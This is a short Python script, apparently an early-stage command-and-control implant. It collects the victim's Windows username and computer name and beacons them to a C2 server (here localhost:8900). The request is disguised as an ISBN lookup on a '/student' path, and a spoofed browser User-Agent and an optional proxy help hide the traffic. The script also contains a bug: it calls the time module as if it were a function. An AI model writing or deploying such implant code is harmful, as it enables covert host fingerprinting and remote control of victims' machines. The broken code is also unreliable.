#!/bin/python3

"""
C2 Client side code
"""
import time
from requests import get
from os import getenv

PORT=8900
PROXY = None
C2_SERVER = "localhost"

CMD_REQUEST = "/student?isbn="

# Windows user & env banner
client = getenv("USERNAME") + "@" + getenv("COMPUTERNAME") + "_" + str(time())

HEADER: dict[str, str] = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# PROXY = {"https": "proxy.some-site.com:443"}

x = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)

print(f"Response Object: {x.request.headers}\n\tHeader: {x.headers}\n\tReason: {x.reason}\n\tStatus: {x.status_code}")

